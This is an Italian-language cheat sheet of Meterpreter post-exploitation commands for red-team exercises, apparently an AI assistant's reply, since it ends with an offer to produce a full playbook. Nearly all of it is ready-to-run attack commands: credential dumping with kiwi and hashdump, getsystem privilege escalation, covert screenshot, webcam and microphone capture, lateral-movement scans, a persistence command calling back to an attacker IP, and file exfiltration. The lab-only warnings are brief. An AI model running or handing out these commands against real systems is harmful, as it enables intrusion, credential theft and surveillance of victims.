# 🔥 Comandi Meterpreter Utili in Attività Red Team (Ambiente di Laboratorio)

Questi comandi aiutano a simulare attività tipiche di un attaccante durante un esercizio di Red Teaming, ma in modo controllato e formativo.

---

## 🧭 **1. Ricognizione dell’host**

### Informazioni generali

```bash
sysinfo
getuid
getprivs
```

### Network

```bash
ipconfig
netstat
route
arp
```

### Enumerazione utenti

```bash
getenv USERNAME
enumdesktops
```

### Ricognizione file system

```bash
ls
pwd
search -f *.txt
search -f password.txt
```

---

## 📡 **2. Raccolta informazioni e credenziali**

### Dump credenziali (in laboratorio)

```bash
load kiwi
kiwi_cmd "creds_all"
```

### Dump SAM (solo se si hanno i privilegi e in lab!)

```bash
hashdump
```

---

## 🎯 **3. Controllo del sistema**

### Ottenere una shell di sistema

```bash
shell
```

### Elevazione dei privilegi (tentativo automatico)

```bash
getsystem
```

### Lista processi e scelta di uno stabile per migrazione

```bash
ps
migrate <PID>
```

---

## 🖥️ **4. Rilevamento attività dell’utente**

### Screenshot

```bash
screenshot
```

### Webcam (solo in ambiente didattico e autorizzato)

```bash
webcam_list
webcam_snap
```

### Audio (solo laboratorio)

```bash
record_mic
```

---

## 🔄 **5. Movimenti laterali – Fase avanzata (solo LAN di laboratorio)**

### Scansione interna tramite modulo portscan

```bash
run post/multi/gather/portscan/tcp
```

### Recupero informazioni host vicini

```bash
run post/windows/gather/enum_logged_on_users
run post/windows/gather/enum_applications
```

---

## 📌 **6. Persistenza (solo in ambiente controllato)**

**⚠️ Nota:** Queste tecniche si usano solo sul *tuo ambiente di test*, mai su sistemi reali senza autorizzazione.

### Esempio di persistente basata su servizio

```bash
run persistence -X -i 5 -p 5555 -r <IP KALI>
```

---

## 📤 **7. Esfiltrazione controllata**

### Download file

```bash
download <percorso/file>
```

### Upload file (per strumenti interni)

```bash
upload /path/file.exe
```

---

## 📂 **8. Gestione sessioni e multi-handler**

### Mettere in background

```bash
background
```

### Lista sessioni

```bash
sessions
```

### Riprendere una sessione

```bash
sessions -i <ID>
```

---

## 🧹 **9. Pulizia (OpSec)**

### Cancellare file creati durante il test

```bash
rm <file>
```

### Uscire dalla sessione

```bash
exit
```

---

Se vuoi, posso prepararti **un file MD completo “Red Team Meterpreter Playbook”** con tutto strutturato in capitoli oppure una **versione PDF pronta da scaricare**.
